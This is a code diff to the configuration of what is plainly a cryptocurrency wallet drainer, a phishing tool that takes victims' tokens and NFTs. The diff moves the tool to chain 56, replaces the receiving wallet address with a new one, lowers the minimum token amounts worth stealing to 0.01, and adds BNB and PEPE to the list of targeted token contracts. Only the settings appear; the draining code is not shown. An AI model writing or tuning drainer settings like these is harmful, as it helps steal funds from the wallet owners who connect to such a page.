@@ -1,6 +1,6 @@
-const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
+const workChainId = 56; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "0xe07B30fb2653e4FC7D8a96f8952A24f63A08B191"; // YOUR WALLET ADDRESS "TUTORIAL"
 
 
 const drainNftsInfo = {
@@ -25,10 +25,12 @@ const erc20list = {
   '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
   */
   // Ethernet mainnet
-  '0x6B175474E89094C44Da98b954EedeAC495271d0F': 3, // DAI ethernet
-  '0xdAC17F958D2ee523a2206206994597C13D831ec7': 3, // usdt
-  '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 3, // usdc
-  '0x4Fabb145d64652a948d72533023f6E7A623C7C53': 3, // busd
+  '0x6B175474E89094C44Da98b954EedeAC495271d0F': 0.01, // DAI ethernet
+  '0xdAC17F958D2ee523a2206206994597C13D831ec7': 0.01, // usdt
+  '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 0.01, // usdc
+  '0xe9e7cea3dedca5984780bafc599bd69add087d56': 0.01, // busd
+  '0xb8c77482e45f1f44de1745f52c74426c631bdd52': 0.01, // BNB
+  '0x25d887ce7a35172c62febfd67a1856f20faebb00': 0.01, // PEPE
 }
 
 const installInNewWindow = true; // install wallet if not installed
